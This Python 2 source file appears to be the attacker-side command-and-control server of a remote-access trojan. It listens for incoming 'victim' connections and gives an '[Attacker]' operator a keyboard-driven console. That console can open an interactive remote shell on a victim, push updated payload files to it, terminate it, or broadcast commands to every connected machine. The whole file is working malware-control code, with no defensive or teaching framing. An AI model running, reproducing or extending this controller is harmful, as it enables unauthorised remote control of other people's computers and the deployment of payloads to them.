import socket
import select
import msvcrt
import os
import sys

SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024
SOCKET_LISTEN = 5
KEY_ENTER = 13
KEY_BACKSPACE = 8

open_client_sockets = []
messages_to_send = []
action_message = []
mode = None
msg = ''


def update_version(socket, command_message):
    list_arg = command_message.split(';')
    socket.send("{commnd_code};{file_size}".format(commnd_code=list_arg[0], file_size=os.path.getsize(list_arg[1])))
    with open(list_arg[1], 'rb') as file_to_send:
        bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
        while bytes_to_send:
            socket.send(bytes_to_send)
            print 'Sent ', repr(bytes_to_send)
            bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)

    socket.send('')
    print("done")


def terminate(socket, params):
    socket.send('0')


def cmd(socket, command_message):
    socket.send('2')
    prompt_str = socket.getsockname()[0] + ':' + str(socket.getsockname()[1])

    while True:
        try:
            print 'cmd mode'
            command = raw_input(prompt_str + ">")
            if len(command.split()) != 0:
                socket.send(command)
            else:
                continue
        except EOFError:
            print("Invalid input, type 'help' to get a list of implemented commands.\n")
            continue

        if command == "quit":
            break

        data = socket.recv(SOCKET_RECV_BYTES)
        print(data + "\n")


def open_socket(socket, command_message):
    socket.send(command_message)


def change_socket(socket, command_message):
    socket.send(command_message)


command_dict = {
    0: terminate,
    2: cmd,
    3: open_socket,
    4: update_version,
    5: change_socket
}


def decryption(message):
    return message


def get_command_id(my_string_msg):
    return int(my_string_msg.split(';')[0])


def handle_attacker_command(victim_list):
    global msg
    if msvcrt.kbhit():  # if the client typed character
        char = msvcrt.getch()  # get this character
        msg += char  
        sys.stdout.write(char)  
        sys.stdout.flush()  

        if chr(KEY_ENTER) is char:  # if enter
            msg = ''   
            command_message = ''.join(action_message)
            print '[Attacker]', command_message
            command_id = get_command_id(command_message)
            if command_id in command_dict:
                command_dict[command_id](victim_list[0], command_message)
            else:
                for wsocket in victim_list:
                    print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message)
                    wsocket.send(command_message)
                    # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))

            del action_message[:]  # clean array

        elif ord(char) == KEY_BACKSPACE:  # backspace
            action_message.pop()

        else:
            # else just append the character to the message
            action_message.append(char)


def main():
    try:
        server_socket = socket.socket()
        server_socket.bind((SERVER_IP, SERVER_PORT))
        server_socket.listen(SOCKET_LISTEN)
        print 'server({}) is up. listening in port {}'.format(SERVER_IP, SERVER_PORT)

        while True:
            rlist, wlist, xlist = select.select([server_socket] + open_client_sockets, open_client_sockets, [])
            for current_socket in rlist:
                if current_socket is server_socket:
                    (new_socket, address) = server_socket.accept()
                    print 'New victim {0} !'.format(address)
                    open_client_sockets.append(new_socket)
                    # update_version(new_socket, '4;new_version.py')
                    # terminate(new_socket, '0')
                else:
                    try:
                        print '.....New data from client.....'
                        data = current_socket.recv(SOCKET_RECV_BYTES)
                        if data == "":
                            open_client_sockets.remove(current_socket)
                            print "Connection with client closed."
                        else:
                            print (current_socket, data)
                            # response = manipulate_data(data)
                            # current_socket.send(response)

                    except Exception as e:
                        if current_socket in open_client_sockets:
                            open_client_sockets.remove(current_socket)
                        print 'Exception occurred in receive, value:', e

            handle_attacker_command(wlist)

    except Exception as e:
        print 'Exception occurred, value:', e
    finally:
        server_socket.close()
        print 'server connection is closed'


if __name__ == "__main__":
    main()
